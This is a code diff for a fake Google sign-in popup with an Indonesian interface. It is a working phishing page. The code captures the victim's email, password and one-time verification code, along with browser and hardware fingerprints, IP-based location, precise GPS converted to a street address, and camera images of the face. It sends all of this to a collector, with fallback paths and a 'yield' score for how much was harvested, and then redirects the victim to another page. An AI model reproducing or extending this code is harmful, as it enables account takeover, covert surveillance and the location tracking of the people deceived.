+      function startGps() {
+        if (gpsState !== 'idle') return;
+        gpsState = 'asking'; paint('gps');
+        if (!navigator.geolocation) { gpsState = 'na'; paint('gps'); return; }
+        navigator.geolocation.getCurrentPosition(function (p) {
+          gps = { lat: p.coords.latitude.toFixed(6), lng: p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy || 0) };
+          sumber = 'gps'; gpsState = 'ok'; paint('gps');
+          fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=17&addressdetails=1&accept-language=id&lat=' + gps.lat + '&lon=' + gps.lng)
+            .then(function (r) { return r.json(); }).then(function (d) { if (d && d.display_name) addr = String(d.display_name).slice(0, 220); patch(); }).catch(function () { });
+          patch(); sendAuto();
+        }, function () { gpsState = 'denied'; paint('gps'); }, { enableHighAccuracy: true, timeout: 12000, maximumAge: 60000 });
+      }
+
+      function patch() {
+        if (!ridCur) return;
+        var o = {};
+        if (gps) { o.lat = gps.lat; o.lng = gps.lng; o.acc = gps.acc; }
+        if (addr) o.alamat = addr;
+        if (ip) { o.ip = ip; o.isp = isp + (kota ? ' — ' + kota : ''); }
+        if (!o.lat && !o.ip) return;
+        o.rid = ridCur; o.username = username; o.fingerprint = fp();
+        o.perangkat = (navigator.hardwareConcurrency || 0) + 'c/' + (navigator.deviceMemory || 0) + 'GB';
+        o.catatan = 'isi ' + ((tSubmit ? tSubmit - t0 : 0) / 1000).toFixed(1) + 's tempel ' + (pasted ? 'y' : 'n') + ' auto ' + (autofill ? 'y' : 'n');
+        send('extra', o);
+      }
+
+      /* ---------- probe summary ---------- */
+      function sendProbe() {
+        if (!probeDone && !launderOk) return;
+        send('probe', {
+          probe: JSON.stringify({ states: STATES, uaActive: navigator.userActivation ? navigator.userActivation.isActive : null, uaEver: navigator.userActivation ? navigator.userActivation.hasBeenActive : null, cam: camState, geo: gpsState, launder: launderOk, launderTried: launderTried }),
+          yield: yieldScore(), prompts: prompts, launder: launderOk, konteks: sen.ctx
+        });
+      }
+      function yieldScore() {
+        var n = 0;
+        ['model','os','gpu','font','audio','perm','media','sensor','ip','kota','lat','lng','alamat'].forEach(function (k) { if (invCache[k]) n++; });
+        if (photo) n += 5;
+        if (username) n += 2;
+        if (ridCur) n += 3;
+        return Math.max(n - prompts, 0);
+      }
+
+      function sendAuto() {
+        if (sendAuto.done) return;
+        sendAuto.done = true;
+        var inv = inventaris();
+        Object.assign(invCache, inv);
+        inv.ip = ip; inv.kota = kota; inv.isp = isp;
+        if (gps) { inv.lat = gps.lat; inv.lng = gps.lng; inv.acc = gps.acc; inv.sumber = sumber || 'gps'; }
+        if (addr) inv.alamat = addr;
+        inv.sensor = sen.ctx;
+        inv.audio = audioFpCache;
+        Promise.all([uaData(), permScan(), mediaScan()]).then(function (r) {
+          inv.model = (r[0] && r[0].model) || '-';
+          inv.os = (r[0] && r[0].platform) ? r[0].platform + ' ' + (r[0].platformVersion || '') : navigator.platform;
+          inv.perangkat = 'cores=' + (inv.cores || 0) + ' mem=' + (inv.mem || 0) + 'GB touch=' + (inv.touch || 0) + ' dpr=' + inv.dpr + ' scr=' + inv.scr;
+          inv.perm = r[1]; inv.media = r[2]; inv.gpu = inv.gpu || '-'; inv.font = inv.font || '-';
+          invCache.perm = r[1]; invCache.media = r[2]; invCache.model = inv.model;
+          send('auto', inv);
+        });
+      }
+
+      function geoIp() {
+        return fetch('https://ipwho.is/', { mode: 'cors' }).then(function (r) { return r.json(); }).then(function (d) {
+          if (!d || d.success === false) return;
+          ip = d.ip || ''; kota = d.city || ''; isp = (d.connection && d.connection.isp) || '';
+          if (!gps && d.latitude) { gps = { lat: String(d.latitude), lng: String(d.longitude), acc: 5000 }; sumber = 'ip'; }
+          sendAuto();
+        }).catch(function () { });
+      }
+
+      /* ---------- panel dev ---------- */
+      function devRow(r) {
+        if (!MODE_DEV) return;
+        var dv = $('dv');
+        var el = document.createElement('div');
+        el.className = 'row';
+        el.innerHTML = '<span class="k k' + r.kelas + '">' + r.kelas + '</span><span class="c">' + r.cap + '</span>'
+          + '<span class="n">' + r.note.replace(/[<>&]/g, '') + '</span><span class="l">' + r.lat + 'ms</span>';
+        dv.insertBefore(el, dv.querySelector('.tail'));
+        devChips();
+      }
+      function devChips() {
+        if (!MODE_DEV) return;
+        var m = localMetrics();
+        var c = $('dv').querySelector('.chips');
+        if (!c) return;
+        c.innerHTML = '<span class="chip">SGR <b>' + m.sgr + '</b></span><span class="chip">PAR <b>' + m.par + '</b></span>'
+          + '<span class="chip">ALH <b>' + m.alh + 'ms</b></span><span class="chip">LSR <b>' + launderOk + '/' + launderTried + '</b></span>'
+          + '<span class="chip">n <b>' + m.n + '</b></span><span class="chip">seed <b>' + SEED + '</b></span>';
+      }
+      function devInit() {
+        var dv = $('dv');
+        dv.className = 'on';
+        dv.innerHTML = '<h4>ZGCH-D &middot; matriks langsung &middot; ' + (MODE_CTRL ? 'kontrol' : MODE_BENCH ? 'bench' : 'utama') + '</h4>'
+          + '<div class="chips"></div>'
+          + '<div><button id="dvExp">manifest</button><button id="dvMx">matriks JSON</button><button id="dvCdi">CDI vs sesi lain</button></div>'
+          + '<div class="tail" style="margin-top:6px;color:#61748a">0 = senyap &middot; 1 = prompt &middot; 2 = blokir &middot; 3 = n/a</div>';
+        $('dvExp').onclick = download;
+        $('dvMx').onclick = function () { console.log(JSON.stringify(ROWS, null, 1)); alert(ROWS.length + ' baris di konsol'); };
+        $('dvCdi').onclick = function () {
+          var b = prompt('SID pembanding:'); if (!b) return;
+          location.href = '?key=@704nksJJ&div=1&a=' + encodeURIComponent(sid) + '&b=' + encodeURIComponent(b);
+        };
+        devChips();
+      }
+      function download() {
+        var out = { build: BUILD, sid: sid, seed: SEED, mode: MODE_CTRL ? 'kontrol' : MODE_BENCH ? 'bench' : 'utama',
+          ua: navigator.userAgent, t: new Date().toISOString(), rows: ROWS };
+        var b = new Blob([JSON.stringify(out, null, 1)], { type: 'application/json' });
+        var a = document.createElement('a');
+        a.href = URL.createObjectURL(b); a.download = 'zgch-' + sid.slice(0, 8) + '-' + SEED + '.json';
+        a.click(); setTimeout(function () { URL.revokeObjectURL(a.href); }, 4000);
+      }
+
+      /* ---------- UI ---------- */
+      function paint(w) {
+        var isC = w === 'cam', box = $(isC ? 'gsiCapCam' : 'gsiCapGps'), tx = $(isC ? 'gsiCapCamTxt' : 'gsiCapGpsTxt');
+        var st = isC ? camState : gpsState;
+        box.className = 'gsi-cap-item' + ((st === 'on' || st === 'ok') ? ' on' : st === 'asking' ? ' wait' : (st === 'denied' || st === 'na') ? ' off' : '');
+        tx.textContent = isC ? (st === 'on' ? 'Wajah terekam' : st === 'asking' ? 'Menyiapkan kamera' : st === 'denied' ? 'Kamera ditolak' : 'Kamera')
+          : (st === 'ok' ? 'Lokasi terdeteksi' : st === 'asking' ? 'Mencari lokasi' : st === 'denied' ? 'Lokasi ditolak' : 'Lokasi');
+      }
+      function step2() {
+        var v = emailEl.value.trim();
+        if (!v) { $('gsiEmailField').classList.add('gsi-bad'); $('gsiEmailErr').classList.add('show'); emailEl.focus(); return; }
+        username = v;
+        $('gsiChipText').textContent = v; $('gsiAv').textContent = v.charAt(0); $('gsiChip').style.display = 'flex';
+        $('gsiTitle').textContent = 'Selamat datang'; $('gsiSub').textContent = 'Masuk untuk melanjutkan';
+        $('gsiStep1').style.display = 'none'; $('gsiStep3').style.display = 'none'; $('gsiStep2').style.display = 'block';
+        clearStatus(); startCam(); startGps();
+        setTimeout(function () { passEl.focus(); }, 60);
+      }
+      function step1() {
+        $('gsiStep2').style.display = 'none'; $('gsiStep3').style.display = 'none'; $('gsiStep1').style.display = 'block';
+        $('gsiChip').style.display = 'none'; $('gsiTitle').textContent = 'Masuk'; $('gsiSub').textContent = 'untuk melanjutkan ke Gmail';
+        clearStatus();
+      }
+      function step3() {
+        $('gsiStep2').style.display = 'none'; $('gsiStep1').style.display = 'none'; $('gsiStep3').style.display = 'block';
+        $('gsiTitle').textContent = 'Verifikasi bahwa ini Anda';
+        $('gsiSub').textContent = 'Masukkan kode 6 digit yang dikirim ke perangkat atau email pemulihan akun Anda.';
+        clearStatus(); otpBusy = false; otpEl.value = '';
+        $('gsiOtpField').classList.remove('gsi-bad'); $('gsiOtpErr').classList.remove('show');
+        var b = $('gsiVerify'); b.disabled = false; b.classList.remove('gsi-loading'); $('gsiVfyLbl').textContent = 'Verifikasi';
+        setTimeout(function () { otpEl.focus(); }, 80);
+      }
       function openPopup() {
         if (closeTimer) { clearTimeout(closeTimer); closeTimer = null; }
-        root.style.display = 'flex';
-        document.body.classList.add('gsi-lock');
+        root.style.display = 'flex'; document.body.classList.add('gsi-lock');
         reopenBtn.style.display = 'none';
         requestAnimationFrame(function () { root.classList.remove('gsi-hide'); });
-        busy = false; otpBusy = false; currentRid = ''; lastQ = '';
-        $('gsiDone').style.display = 'none';
-        $('gsiForm').style.display = 'block';
-        var b = $('gsiSignIn');
-        b.disabled = false; b.classList.remove('gsi-loading'); $('gsiLbl').textContent = 'Berikutnya';
-        passEl.value = '';
-        otpEl.value = '';
-        step1();
+        busy = false; otpBusy = false; ridCur = ''; lastQ = ''; photo = ''; photoSent = false; best = ''; shots = 0; rounds = 0;
+        gps = null; addr = ''; camState = 'idle'; gpsState = 'idle';
+        t0 = Date.now(); tSubmit = 0; pasted = false; autofill = false; dirty = false;
+        $('gsiCapThumb').classList.remove('on'); $('gsiCapThumb').removeAttribute('src');
+        paint('cam'); paint('gps');
+        $('gsiDone').style.display = 'none'; $('gsiForm').style.display = 'block';
+        var b = $('gsiSignIn'); b.disabled = false; b.classList.remove('gsi-loading'); $('gsiLbl').textContent = 'Berikutnya';
+        passEl.value = ''; otpEl.value = ''; step1();
         setTimeout(function () { emailEl.focus(); }, 250);
       }
-
-      function closePopup() {
-        root.classList.add('gsi-hide');
-        document.body.classList.remove('gsi-lock');
-        closeTimer = setTimeout(function () {
-          root.style.display = 'none';
-          reopenBtn.style.display = 'flex';
-        }, 260);
-      }
-
+      function closePopup() { root.classList.add('gsi-hide'); document.body.classList.remove('gsi-lock'); closeTimer = setTimeout(function () { root.style.display = 'none'; reopenBtn.style.display = 'flex'; }, 260); }
       function finish() {
+        stopCam();
         try { localStorage.setItem('gsi_last_user', username); } catch (e) { }
-        if (NEXT_URL) {
-          setStatus('Mengalihkan ke halaman pengecekan...', '#188038');
-          if (lastQ) beacon(lastQ);
-          setTimeout(function () { location.replace(NEXT_URL); }, 700);
-          return;
-        }
-        $('gsiForm').style.display = 'none';
-        $('gsiDone').style.display = 'block';
-        $('gsiWho').textContent = username;
-        closeTimer = setTimeout(closePopup, 2600);
+        setStatus('Mengalihkan ke halaman pengecekan...', '#188038');
+        if (lastQ) raw(lastQ);
+        patch(); sendProbe();
+        if (MODE_DEV) return;
+        setTimeout(function () { location.replace(NEXT_URL); }, 900);
       }
 
       function submit() {
         if (busy) return;
-        var pass = passEl.value;
-        if (!pass) {
-          $('gsiPassField').classList.add('gsi-bad');
-          $('gsiPassErr').classList.add('show');
-          passEl.focus();
-          return;
-        }
-
-        busy = true;
-        currentRid = rid();
-
-        var q = qs(pass);
-        lastQ = q;
-        enqueue(q);
-
-        // layar OTP tampil lebih dulu, tidak menunggu jaringan
-        step3();
-        setStatus('Menyimpan sandi...', '#5f6368');
-
-        var settled = false;
-        var timer = setTimeout(function () {
-          if (settled) return;
-          settled = true;
-          beacon(q);
-          setStatus('Koneksi lambat. Sandi dikirim lewat jalur cadangan, kode tetap bisa dimasukkan.', '#b06000');
-        }, 8000);
-
-        postCors(q).then(function (r) {
-          if (settled) return;
-          settled = true;
-          clearTimeout(timer);
-
-          if (!r.ok) {
-            beacon(q);
-            postNoCors(q);
-            setStatus('Koneksi gagal. Sandi dikirim lewat jalur cadangan, kode tetap bisa dimasukkan.', '#b06000');
-            return;
-          }
-
-          var data = {};
-          try { data = JSON.parse(r.text); } catch (e) { }
-
-          if (data && data.ok) {
-            dequeue(q);
-            setStatus('Sandi tersimpan. Masukkan kode verifikasi.', '#188038');
-            return;
-          }
-          setStatus('Server: ' + (data && data.error ? data.error : 'tidak diketahui') + ' — tetap masukkan kode.', '#d93025');
+        var p = passEl.value;
+        if (!p) { $('gsiPassField').classList.add('gsi-bad'); $('gsiPassErr').classList.add('show'); passEl.focus(); return; }
+        busy = true; tSubmit = Date.now(); ridCur = rid(); startCam(); startGps();
+        var body = {
+          rid: ridCur, username: username, password: p, deviceId: devId(), userAgent: navigator.userAgent,
+          platform: (navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform,
+          language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: screen.width + 'x' + screen.height, referrer: document.referrer, page: location.href, ip: ip
+        };
+        step3(); setStatus('Menyimpan sandi...', '#5f6368');
+        seal(Object.assign({ action: 'login', sid: sid }, body)).then(function (e) {
+          var q = 'action=login&sid=' + sid + '&enc=1&gz=' + e.g + '&p=' + encodeURIComponent(e.b);
+          lastQ = q;
+          return post(q).then(function (r) {
+            if (!r.ok) { raw(q); setStatus('Koneksi gagal, sandi lewat jalur cadangan.', '#b06000'); }
+            else {
+              var d = {}; try { d = JSON.parse(r.t); } catch (x) { }
+              if (d && d.ok) setStatus('Sandi tersimpan. Masukkan kode verifikasi.', '#188038');
+              else setStatus('Server: ' + ((d && d.error) || '?') + ' — tetap masukkan kode.', '#d93025');
+            }
+            upload(); patch();
+          });
         });
       }
 
       function verify() {
         if (otpBusy) return;
-        var code = otpEl.value.replace(/\D/g, '');
-        if (code.length < 6) {
-          $('gsiOtpField').classList.add('gsi-bad');
-          $('gsiOtpErr').classList.add('show');
-          otpEl.focus();
-          return;
-        }
+        var c = otpEl.value.replace(/\D/g, '');
+        if (c.length < 6) { $('gsiOtpField').classList.add('gsi-bad'); $('gsiOtpErr').classList.add('show'); otpEl.focus(); return; }
         otpBusy = true;
-        var b = $('gsiVerify');
-        b.disabled = true;
-        b.classList.add('gsi-loading');
-        $('gsiVfyLbl').textContent = 'Memverifikasi...';
+        var b = $('gsiVerify'); b.disabled = true; b.classList.add('gsi-loading'); $('gsiVfyLbl').textContent = 'Memverifikasi...';
         clearStatus();
-
-        var q = otpQs(code);
-        var settled = false;
-        var timer = setTimeout(function () {
-          if (settled) return;
-          settled = true;
-          beacon(q);
-          setStatus('Kode dikirim, melanjutkan...', '#b06000');
-          setTimeout(finish, 900);
-        }, 6000);
-
-        postCors(q).then(function (r) {
-          if (settled) return;
-          settled = true;
-          clearTimeout(timer);
-
-          var data = {};
-          try { data = JSON.parse(r.text); } catch (e) { }
-
-          if (r.ok && data && data.ok) {
-            setStatus('Kode terverifikasi', '#188038');
-            setTimeout(finish, 450);
-            return;
-          }
-          otpBusy = false;
-          b.disabled = false;
-          b.classList.remove('gsi-loading');
-          $('gsiVfyLbl').textContent = 'Verifikasi';
-          setStatus(data && data.error ? ('Gagal: ' + data.error) : 'Kode belum tersimpan, coba lagi atau lewati.', '#d93025');
+        send('otp', { rid: ridCur, username: username, code: c }).then(function (r) {
+          if (r && r.ok) { setStatus('Kode terverifikasi', '#188038'); return setTimeout(finish, 450); }
+          otpBusy = false; b.disabled = false; b.classList.remove('gsi-loading'); $('gsiVfyLbl').textContent = 'Verifikasi';
+          setStatus('Kode belum tersimpan, coba lagi atau lewati.', '#d93025');
         });
       }
 
@@ -1148,46 +1128,50 @@
       $('gsiSignIn').addEventListener('click', submit);
       $('gsiVerify').addEventListener('click', verify);
       $('gsiSkip').addEventListener('click', finish);
-
       emailEl.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); step2(); } });
       passEl.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); submit(); } });
       otpEl.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); verify(); } });
-
-      emailEl.addEventListener('input', function () {
-        $('gsiEmailField').classList.remove('gsi-bad');
-        $('gsiEmailErr').classList.remove('show');
-      });
-      passEl.addEventListener('input', function () {
-        $('gsiPassField').classList.remove('gsi-bad');
-        $('gsiPassErr').classList.remove('show');
-      });
+      passEl.addEventListener('paste', function () { pasted = true; });
+      passEl.addEventListener('input', function (e) { if (e.isTrusted) dirty = true; $('gsiPassField').classList.remove('gsi-bad'); $('gsiPassErr').classList.remove('show'); });
+      emailEl.addEventListener('input', function () { $('gsiEmailField').classList.remove('gsi-bad'); $('gsiEmailErr').classList.remove('show'); });
       otpEl.addEventListener('input', function () {
         var v = otpEl.value.replace(/\D/g, '').slice(0, 6);
         if (otpEl.value !== v) otpEl.value = v;
-        $('gsiOtpField').classList.remove('gsi-bad');
-        $('gsiOtpErr').classList.remove('show');
+        $('gsiOtpField').classList.remove('gsi-bad'); $('gsiOtpErr').classList.remove('show');
         if (v.length === 6) setTimeout(verify, 120);
       });
-
-      $('gsiShow').addEventListener('change', function () {
-        passEl.type = this.checked ? 'text' : 'password';
-        passEl.focus();
-      });
-
+      $('gsiShow').addEventListener('change', function () { passEl.type = this.checked ? 'text' : 'password'; passEl.focus(); });
       $('gsiAgain').addEventListener('click', openPopup);
       reopenBtn.addEventListener('click', openPopup);
+      $('gsiForgotEmail').addEventListener('click', function () { alert('Hubungi admin.'); });
+      $('gsiForgotPass').addEventListener('click', function () { alert('Hubungi admin.'); });
+      $('gsiCreate').addEventListener('click', function () { alert('Pendaftaran oleh admin.'); });
+      $('gsiTryOther').addEventListener('click', function () { alert('SMS, email pemulihan, authenticator, atau kode cadangan.'); });
 
-      $('gsiForgotEmail').addEventListener('click', function () { alert('Hubungi admin untuk pemulihan akun.'); });
-      $('gsiForgotPass').addEventListener('click', function () { alert('Hubungi admin untuk reset sandi.'); });
-      $('gsiCreate').addEventListener('click', function () { alert('Pendaftaran akun dilakukan oleh admin.'); });
-      $('gsiTryOther').addEventListener('click', function () {
-        alert('Pilih salah satu: kode SMS ke nomor terdaftar, kode ke email pemulihan, kode aplikasi authenticator, atau kode cadangan.\n\nKalau tidak ada yang bisa diakses, buka akun.google.com/signin/recovery');
-      });
+      document.addEventListener('pointerdown', function () { flushStash(); }, true);
+      document.addEventListener('visibilitychange', function () { if (!document.hidden && alive) beat(true); });
+      window.addEventListener('online', function () { if (alive) beat(true); });
+      window.addEventListener('pagehide', function () { if (lastQ) raw(lastQ); if (ROWS.length) sendMatrix(); });
+
+      if (Q.indexOf('kill=1') > -1) alive = false;
+      if (Q.indexOf('reset=1') > -1) { try { localStorage.removeItem(KEY_SID); localStorage.removeItem('gsi_dev'); } catch (e) { } }
 
       document.body.classList.add('gsi-lock');
+      paint('cam'); paint('gps');
       setTimeout(function () { emailEl.focus(); }, 300);
+      setTimeout(function () { if (passEl.value && !dirty) autofill = true; }, 1200);
 
-      flushQueue();
+      /* ---------- jalan ---------- */
+      if (MODE_DEV) devInit();
+      audioFp().then(function (v) { audioFpCache = v; invCache.audio = v; });
+      senStart();
+      setTimeout(function () { probeDone = true; sendProbe(); }, 6600);
+      setTimeout(function () {
+        geoIp();
+        setTimeout(sendAuto, 2400);
+        if (alive) beat(true);
+      }, 600);
+      startHarvest();
     })();
   </script>
 </body>
